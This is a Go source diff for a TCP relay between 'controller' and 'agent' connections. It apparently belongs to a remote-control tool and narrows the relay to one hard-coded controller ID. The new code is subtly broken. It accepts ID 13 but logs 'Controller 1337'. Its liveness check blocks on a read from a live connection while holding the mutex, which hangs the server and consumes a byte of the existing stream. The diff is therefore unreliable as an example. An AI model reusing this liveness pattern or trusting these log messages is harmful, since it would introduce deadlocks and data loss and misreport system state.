@@ -9,17 +9,11 @@ import (
 	"sync"
 )
 
-type ControllerConn struct {
-	Conn net.Conn
-	ID   int
-}
-
 var (
-	controllerSessions = make(map[int]net.Conn)
-	controllerLock     sync.Mutex
+	controllerConn net.Conn
+	controllerLock sync.Mutex
 )
 
-// Reads a JSON message prefixed with 4-byte big-endian length
 func readJSON(conn net.Conn) (map[string]interface{}, error) {
 	lengthBuf := make([]byte, 4)
 	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
@@ -38,7 +32,6 @@ func readJSON(conn net.Conn) (map[string]interface{}, error) {
 	return msg, err
 }
 
-// Writes a JSON message with a 4-byte big-endian length prefix
 func writeJSON(conn net.Conn, obj interface{}) error {
 	data, err := json.Marshal(obj)
 	if err != nil {
@@ -63,22 +56,35 @@ func handleController(conn net.Conn, agentConn net.Conn) {
 	}
 
 	idFloat, ok := msg["controller_id"].(float64)
-	if !ok {
-		log.Println("[X] Invalid controller_id")
+	if !ok || int(idFloat) != 13 {
+		log.Println("[!] Invalid controller_id, rejected")
 		return
 	}
-	controllerID := int(idFloat)
 
 	controllerLock.Lock()
-	if _, exists := controllerSessions[controllerID]; exists {
-		controllerLock.Unlock()
-		log.Printf("[!] Duplicate controller ID %d rejected\n", controllerID)
-		return
+	if controllerConn != nil {
+		// Check if existing conn is still alive
+		one := make([]byte, 1)
+		connCheck := make(chan bool, 1)
+		go func(c net.Conn) {
+			_, err := c.Read(one)
+			connCheck <- err != nil
+		}(controllerConn)
+
+		if <-connCheck == false {
+			log.Println("[!] Controller 1337 already connected and alive, rejecting new")
+			controllerLock.Unlock()
+			return
+		}
+
+		controllerConn.Close()
+		controllerConn = nil
+		log.Println("[*] Previous controller appears dead, accepting new")
 	}
-	controllerSessions[controllerID] = conn
+	controllerConn = conn
 	controllerLock.Unlock()
 
-	log.Printf("[+] Controller %d connected\n", controllerID)
+	log.Println("[+] Controller 1337 connected")
 
 	for {
 		msg, err := readJSON(conn)
@@ -105,7 +111,9 @@ func handleController(conn net.Conn, agentConn net.Conn) {
 	}
 
 	controllerLock.Lock()
-	delete(controllerSessions, controllerID)
+	if controllerConn == conn {
+		controllerConn = nil
+	}
 	controllerLock.Unlock()
 }
 
